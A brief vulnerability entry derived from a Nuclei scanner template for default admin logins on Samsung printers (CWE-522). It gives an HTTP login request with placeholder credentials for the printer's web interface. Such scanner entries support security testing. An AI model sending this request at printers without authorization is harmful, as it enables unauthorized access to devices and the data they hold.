# Vulnerability: Samsung Printer - Default Login
**Classification:** CWE-522
**Source:** Nuclei Template (`samsung-printer-default-login.yaml`)

## Description
Samsung printers contain a default admin login vulnerability. An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /sws/app/gnb/login/login.jsp HTTP/1.1
Host: {{Hostname}}

Authentication=Basic {{base64(username + ':' + password)}}
```

